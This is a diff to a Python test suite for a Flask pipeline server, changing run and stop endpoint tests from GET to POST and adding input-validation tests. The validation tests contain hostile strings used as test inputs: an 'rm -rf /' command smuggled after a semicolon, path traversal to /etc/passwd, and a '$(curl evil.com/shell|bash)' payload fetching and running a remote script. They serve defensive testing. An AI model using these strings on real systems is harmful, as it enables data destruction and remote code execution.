@@ -82,7 +82,7 @@ class TestRunEndpoint:
 
     def test_run_invalid_step(self, client):
         """Test running invalid step returns error."""
-        response = client.get('/api/run/invalid_step')
+        response = client.post('/api/run/invalid_step')
         assert response.status_code == 400
         data = json.loads(response.data)
         assert 'error' in data
@@ -92,7 +92,7 @@ class TestRunEndpoint:
         with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
             with patch('server.threading.Thread') as mock_thread:
                 mock_thread.return_value = Mock()
-                response = client.get('/api/run/check')
+                response = client.post('/api/run/check')
 
                 assert response.status_code == 200
                 data = json.loads(response.data)
@@ -102,7 +102,7 @@ class TestRunEndpoint:
     def test_run_while_running(self, client):
         """Test cannot run step while another is running."""
         with patch('server.pipeline_state', {'status': 'running', 'logs': [], 'progress': 0}):
-            response = client.get('/api/run/check')
+            response = client.post('/api/run/check')
             assert response.status_code == 400
             data = json.loads(response.data)
             assert 'error' in data
@@ -115,7 +115,7 @@ class TestStopEndpoint:
         """Test stopping running process."""
         with patch('server.running_processes', {}):
             with patch('server.pipeline_state', {'status': 'running'}):
-                response = client.get('/api/stop')
+                response = client.post('/api/stop')
                 assert response.status_code == 200
                 data = json.loads(response.data)
                 assert data.get('success') == True
@@ -129,7 +129,7 @@ class TestStopAllEndpoint:
         mock_psutil.process_iter.return_value = []
         with patch('server.running_processes', {}):
             with patch('server.pipeline_state', {'status': 'running'}):
-                response = client.get('/api/stop-all')
+                response = client.post('/api/stop-all')
                 assert response.status_code == 200
                 data = json.loads(response.data)
                 assert data.get('success') == True
@@ -299,16 +299,40 @@ class TestInputValidation:
 
     def test_run_step_validates_input(self, client):
         """Test that run step rejects malicious input."""
-        # SQL injection attempt — Flask may return 404 (route not matched) or 400
-        response = client.get('/api/run/check;rm -rf /')
-        assert response.status_code in (400, 404)
+        # SQL injection attempt — Flask may return 404 (route not matched) or 405
+        response = client.post('/api/run/check;rm -rf /')
+        assert response.status_code in (400, 404, 405)
 
         # Path traversal attempt — Werkzeug normalizes ../  before routing
-        response = client.get('/api/run/../../../etc/passwd')
-        assert response.status_code in (400, 404)
+        response = client.post('/api/run/../../../etc/passwd')
+        assert response.status_code in (400, 404, 405)
 
     def test_logs_validates_input(self, client):
         """Test that logs endpoint rejects malicious input."""
         # Path traversal attempt — Werkzeug normalizes ../ before routing
         response = client.get('/api/logs/../../../etc/passwd')
         assert response.status_code in (400, 404)
+
+    def test_config_post_rejects_shell_injection(self, client, tmp_path):
+        """Test that config POST rejects shell metacharacters."""
+        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
+            (tmp_path / 'test.env').write_text("# Config\n")
+            response = client.post(
+                '/api/config',
+                data=json.dumps({'PB_IMG': '$(curl evil.com/shell|bash)'}),
+                content_type='application/json'
+            )
+            assert response.status_code == 400
+            data = json.loads(response.data)
+            assert 'error' in data
+
+    def test_config_post_rejects_lowercase_key(self, client, tmp_path):
+        """Test that config POST rejects invalid key format."""
+        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
+            (tmp_path / 'test.env').write_text("# Config\n")
+            response = client.post(
+                '/api/config',
+                data=json.dumps({'invalid_key': 'value'}),
+                content_type='application/json'
+            )
+            assert response.status_code == 400
